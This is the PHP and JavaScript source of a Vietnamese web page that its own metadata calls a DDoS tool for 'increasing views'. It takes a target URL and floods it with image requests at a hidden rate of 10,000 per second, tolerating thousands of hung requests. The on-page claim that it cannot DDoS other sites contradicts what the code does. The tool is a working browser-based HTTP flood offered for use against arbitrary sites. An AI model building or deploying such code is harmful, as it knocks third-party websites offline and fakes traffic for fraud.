<?php
/**
 * Code by thaibinhvip - https://www.facebook.com/botsim
 * @Copyright S2VN.TOP
 * Website: https://nam.name.vn
 * 
 */
$mkey = 'Công cụ chỉ dùng để tăng view nhẹ autohit để tăng traffic ảo cho trang của bạn không có khả năng ddos hay tấn công trang web khác!';
$key = 'Tools Công cụ Ddos tăng visit/lượt view cho trang Wap/Web';
include 'template/header.php';
echo '<div class="breadcrumb-nen">
<div class="qdk_breadcrumb" xmlns:v="http://rdf.data-vocabulary.org/#"><div class="breadcrumbs" xmlns:v="http://rdf.data-vocabulary.org/#"><span class="crumb" style="padding-left:8px;" typeof="v:Breadcrumb"><a href="/" rel="v:url" property="v:title">Home</a></span>  <span class="crumb" typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="/ddos.php" title="Tăng Lượt Xem Cho Wap/Web">Tăng Lượt Xem Cho Wap/Web</a></span></div></div></div>
	<div class="gmenu">'.$mkey.'</div>
	<div class="menu">
	Nhập URL:<br/>
	<input type="text" id="targetURL" value="" placeholder="http://">
	 <input type="hidden" style="width: 40&;" id="rps" value="10000" >
	<input type="hidden" style="width: 50%;" id="message" value="Bot Google" >
	<button id="fireButton" class="gmenu">Bắt Đầu</button>
	</div>
<div class="phdr border_red">Tình trạng</div>
	<div class="menu">Yêu Cầu : <a id="requestedCtr">0</a></div>
	 <div class="menu">Thất Bại: <a id="succeededCtr">0</a></div>
	<div class="menu">Đã Gửi: <a id="failedCtr">0</a></div>';
?>
<script>
	        (function () {
	            var fireInterval;
	            var isFiring = false;
	            var requestedCtrNode = document.getElementById("requestedCtr"),
	                succeededCtrNode = document.getElementById("succeededCtr"),
	                failedCtrNode = document.getElementById("failedCtr"),
	                targetURLNode = document.getElementById("targetURL"),
	                fireButton = document.getElementById("fireButton"),
	                messageNode = document.getElementById("message"),
	                rpsNode = document.getElementById("rps"),
	                timeoutNode = document.getElementById("timeout");
	            var targetURL = targetURLNode.value;
	            targetURLNode.onchange = function () {
	                targetURL = this.value;
	            };
	
	            var requestsHT = {}; // requests hash table, may come in handy later
	
	            var requestedCtr = 0,
	                succeededCtr = 0,
	                failedCtr = 0;
	
	            var makeHttpRequest = function () {
					
						if (requestedCtr > failedCtr + succeededCtr + 10000) { //Allow no more than 1000 hung requests
							return;
						};
						
	                    var rID =Number(new Date());
	                    var img = new Image();
	                    img.onerror = function () { onFail(rID); };
	                    img.onabort = function () { onFail(rID); };
	                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
						
						img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
	                    requestsHT[rID] = img;
	                    onRequest(rID);
	                };
	
	            var onRequest = function (rID) {
	                    requestedCtr++;
	                    requestedCtrNode.innerHTML = requestedCtr;
	                };
	
	            var onComplete = function (rID) {
	                    delete requestsHT[rID];
	                };
	
	            var onFail = function (rID) {
	                    failedCtr++;
	                    failedCtrNode.innerHTML = failedCtr;
	                    delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
	                };
	
	            var onSuccess = function (rID) {
	                    succeededCtr++;
	                    succeededCtrNode.innerHTML = succeededCtr;
	                    delete requestsHT[rID];
	                };
	
	            fireButton.onclick = function () {
	                if (isFiring) {
	                    clearInterval(fireInterval)
	
	                    isFiring = false;
	                    this.innerHTML = "Tiếp Tục";
	                } else {
	                    isFiring = true;
	                    this.innerHTML = "Tạm Dừng";
	
	                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
	                }
	            };
	
	        })();
	    </script>
<?php
include 'template/xemthem.php';
include 'template/footer.php'; ?>